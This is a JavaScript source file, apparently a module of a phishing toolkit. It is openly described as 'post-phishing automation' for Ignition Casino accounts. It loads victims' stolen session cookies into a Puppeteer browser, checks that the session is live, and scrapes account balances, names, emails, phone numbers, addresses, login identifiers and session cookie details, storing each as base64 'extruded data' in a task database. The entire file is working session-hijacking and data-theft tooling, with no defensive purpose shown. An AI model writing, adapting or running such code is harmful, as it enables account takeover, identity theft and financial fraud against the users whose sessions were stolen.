const necrohelp = require('../../tasks/helpers/necrohelp')
const db = require('../../db/db')
const clusterLib = require('../../puppeteer/cluster')

/**
 * Ignition Casino Necroscripts
 * 
 * Purpose: Post-phishing automation for Ignition Casino accounts
 * Target: ignitioncasino.ooo (online casino/poker platform)
 * 
 * Available Functions:
 * - GetAccountInfo: Extract balance, personal details, and login information
 */

/**
 * GetAccountInfo - Extract account balance, personal details, and login information
 * 
 * Extracts:
 * - Account balance (poker, casino, sports)
 * - Personal information (name, email, phone, address)
 * - Login credentials (email/username)
 * 
 * @param {Object} page - Puppeteer page object
 * @param {Array} data - [taskId, cookies, params]
 */
exports.GetAccountInfo = async ({ page, data: [taskId, cookies, params] }) => {
    try {
        await db.UpdateTaskStatus(taskId, "running")
        console.log(`[${taskId}] Starting Ignition Casino account info extraction`)

        // Set cookies and navigate to main page
        await page.setCookie(...cookies)
        await page.goto('https://www.ignitioncasino.ooo', { waitUntil: 'networkidle0', timeout: 30000 })
        await necrohelp.Sleep(3000)

        // Increase zoom for debugging in GUI mode
        await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)

        // Check if logged in
        const loggedInSelectors = [
            'a[href*="account"]',
            'button[aria-label*="account"]',
            '.user-balance',
            '.account-menu'
        ]

        let isLoggedIn = false
        for (const selector of loggedInSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                isLoggedIn = true
                console.log(`[${taskId}] Session validated with selector: ${selector}`)
                break
            }
        }

        if (!isLoggedIn) {
            console.log(`[${taskId}] Session appears invalid`)
            await necrohelp.ScreenshotCurrentPage(page, taskId)
            await db.UpdateTaskStatusWithReason(taskId, "error", "Session not authenticated")
            return
        }

        // Take initial screenshot
        await necrohelp.ScreenshotCurrentPage(page, taskId)
        await db.AddExtrudedData(taskId, 'step', Buffer.from('01_logged_in_homepage').toString('base64'))

        // Extract balance from homepage
        console.log(`[${taskId}] Extracting account balance`)
        const balanceData = await extractBalance(page, taskId)
        if (balanceData) {
            await db.AddExtrudedData(taskId, 'balance', Buffer.from(JSON.stringify(balanceData)).toString('base64'))
            console.log(`[${taskId}] Balance extracted: ${JSON.stringify(balanceData)}`)
        }

        // Navigate to account page
        console.log(`[${taskId}] Navigating to account section`)
        const accountUrls = [
            'https://www.ignitioncasino.ooo/account',
            'https://www.ignitioncasino.ooo/my-account',
            'https://www.ignitioncasino.ooo/profile'
        ]

        let accountPageFound = false
        for (const url of accountUrls) {
            try {
                await page.goto(url, { waitUntil: 'networkidle0', timeout: 15000 })
                await necrohelp.Sleep(3000)
                
                const accountIndicators = await page.$('.account-info, .profile-info, .user-profile').catch(() => null)
                if (accountIndicators) {
                    accountPageFound = true
                    console.log(`[${taskId}] Found account page at: ${url}`)
                    break
                }
            } catch (err) {
                console.log(`[${taskId}] Failed to load ${url}: ${err.message}`)
            }
        }

        // Screenshot account page
        await necrohelp.ScreenshotCurrentPage(page, taskId)
        await db.AddExtrudedData(taskId, 'step', Buffer.from('02_account_page').toString('base64'))

        // Extract personal information
        console.log(`[${taskId}] Extracting personal information`)
        const personalInfo = await extractPersonalInfo(page, taskId)
        if (personalInfo) {
            await db.AddExtrudedData(taskId, 'personal_info', Buffer.from(JSON.stringify(personalInfo)).toString('base64'))
            console.log(`[${taskId}] Personal info extracted: ${JSON.stringify(personalInfo)}`)
        }

        // Extract login details (email/username)
        console.log(`[${taskId}] Extracting login details`)
        const loginDetails = await extractLoginDetails(page, taskId)
        if (loginDetails) {
            await db.AddExtrudedData(taskId, 'login_details', Buffer.from(JSON.stringify(loginDetails)).toString('base64'))
            console.log(`[${taskId}] Login details extracted`)
        }

        // Create summary
        const summary = {
            balance: balanceData,
            personalInfo: personalInfo,
            loginDetails: loginDetails,
            extractedAt: new Date().toISOString()
        }

        await db.AddExtrudedData(taskId, 'summary', Buffer.from(JSON.stringify(summary, null, 2)).toString('base64'))

        console.log(`[${taskId}] Account info extraction completed successfully`)
        await db.UpdateTaskStatus(taskId, "completed")

    } catch (error) {
        console.log(`[${taskId}] Error during extraction: ${error.message}`)
        await necrohelp.ScreenshotCurrentPage(page, taskId).catch(console.error)
        await db.UpdateTaskStatusWithReason(taskId, "error", error.message)
    }
}

// ============================================================================
// Helper Functions
// ============================================================================

async function extractBalance(page, taskId) {
    try {
        const balanceSelectors = [
            '.balance-amount',
            '.user-balance',
            '[class*="balance"]',
            '[data-balance]',
            '.account-balance',
            '.wallet-balance'
        ]

        const balances = {}
        
        // Try to find balance elements
        for (const selector of balanceSelectors) {
            const elements = await page.$$(selector).catch(() => [])
            for (const element of elements) {
                const text = await element.evaluate(el => el.textContent).catch(() => '')
                if (text && text.match(/\$?\d+\.?\d*/)) {
                    const match = text.match(/\$?(\d+\.?\d*)/)
                    if (match) {
                        balances[selector] = match[1]
                    }
                }
            }
        }

        // Try to extract from page content
        const pageContent = await page.content()
        const balanceMatches = pageContent.match(/balance["\s:]+\$?(\d+\.?\d*)/gi)
        if (balanceMatches) {
            balances.fromContent = balanceMatches.slice(0, 5) // Limit to first 5 matches
        }

        // Try to find specific wallet types
        const walletTypes = ['poker', 'casino', 'sports', 'total']
        for (const type of walletTypes) {
            const regex = new RegExp(`${type}[\\s\\S]{0,50}\\$?(\\d+\\.?\\d*)`, 'i')
            const match = pageContent.match(regex)
            if (match) {
                balances[type] = match[1]
            }
        }

        return Object.keys(balances).length > 0 ? balances : null
    } catch (error) {
        console.log(`[${taskId}] Error extracting balance: ${error.message}`)
        return null
    }
}

async function extractPersonalInfo(page, taskId) {
    try {
        const info = {}

        // Try to extract email
        const emailSelectors = [
            'input[type="email"]',
            '[data-email]',
            '.user-email',
            '.account-email',
            'input[name*="email"]'
        ]
        
        for (const selector of emailSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                const value = await element.evaluate(el => el.value || el.textContent || el.getAttribute('value')).catch(() => '')
                if (value && value.includes('@')) {
                    info.email = value.trim()
                    break
                }
            }
        }

        // Try to extract name
        const nameSelectors = [
            'input[name*="name"]',
            'input[name="firstName"]',
            'input[name="lastName"]',
            '.user-name',
            '.account-name',
            '[data-name]'
        ]
        
        for (const selector of nameSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                const value = await element.evaluate(el => el.value || el.textContent).catch(() => '')
                if (value && value.length > 1) {
                    if (selector.includes('first')) {
                        info.firstName = value.trim()
                    } else if (selector.includes('last')) {
                        info.lastName = value.trim()
                    } else {
                        info.name = value.trim()
                    }
                }
            }
        }

        // Try to extract phone
        const phoneSelectors = [
            'input[type="tel"]',
            'input[name*="phone"]',
            '[data-phone]',
            '.user-phone'
        ]
        
        for (const selector of phoneSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                const value = await element.evaluate(el => el.value || el.textContent).catch(() => '')
                if (value && value.match(/\d{3,}/)) {
                    info.phone = value.trim()
                    break
                }
            }
        }

        // Try to extract address
        const addressSelectors = [
            'input[name*="address"]',
            'input[name*="street"]',
            'input[name*="city"]',
            'input[name*="state"]',
            'input[name*="zip"]',
            'input[name*="country"]'
        ]
        
        for (const selector of addressSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                const value = await element.evaluate(el => el.value || el.textContent).catch(() => '')
                if (value) {
                    const fieldName = selector.match(/name\*?=["']?(\w+)["']?/)?.[1] || 'address'
                    info[fieldName] = value.trim()
                }
            }
        }

        // Try to extract from page text
        if (Object.keys(info).length === 0) {
            const pageText = await page.evaluate(() => document.body.innerText)
            
            // Look for email in text
            const emailMatch = pageText.match(/[\w\.-]+@[\w\.-]+\.\w+/)
            if (emailMatch) {
                info.email = emailMatch[0]
            }
            
            // Look for phone in text
            const phoneMatch = pageText.match(/\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/)
            if (phoneMatch) {
                info.phone = phoneMatch[0]
            }
        }

        return Object.keys(info).length > 0 ? info : null
    } catch (error) {
        console.log(`[${taskId}] Error extracting personal info: ${error.message}`)
        return null
    }
}

async function extractLoginDetails(page, taskId) {
    try {
        const loginDetails = {}

        // Extract username/email used for login
        const usernameSelectors = [
            'input[name="username"]',
            'input[name="email"]',
            'input[type="email"]',
            '[data-username]',
            '.login-email',
            '.account-username'
        ]

        for (const selector of usernameSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                const value = await element.evaluate(el => el.value || el.textContent || el.getAttribute('value')).catch(() => '')
                if (value) {
                    if (value.includes('@')) {
                        loginDetails.loginEmail = value.trim()
                    } else {
                        loginDetails.username = value.trim()
                    }
                }
            }
        }

        // Extract account ID if visible
        const accountIdSelectors = [
            '[data-account-id]',
            '.account-id',
            'input[name*="accountId"]'
        ]

        for (const selector of accountIdSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                const value = await element.evaluate(el => el.value || el.textContent || el.getAttribute('data-account-id')).catch(() => '')
                if (value) {
                    loginDetails.accountId = value.trim()
                    break
                }
            }
        }

        // Try to get login info from cookies
        const cookies = await page.cookies()
        const relevantCookies = cookies.filter(c => 
            c.name.toLowerCase().includes('user') || 
            c.name.toLowerCase().includes('account') ||
            c.name.toLowerCase().includes('session')
        )

        if (relevantCookies.length > 0) {
            loginDetails.sessionCookies = relevantCookies.map(c => ({
                name: c.name,
                domain: c.domain,
                path: c.path,
                secure: c.secure,
                httpOnly: c.httpOnly
            }))
        }

        return Object.keys(loginDetails).length > 0 ? loginDetails : null
    } catch (error) {
        console.log(`[${taskId}] Error extracting login details: ${error.message}`)
        return null
    }
}
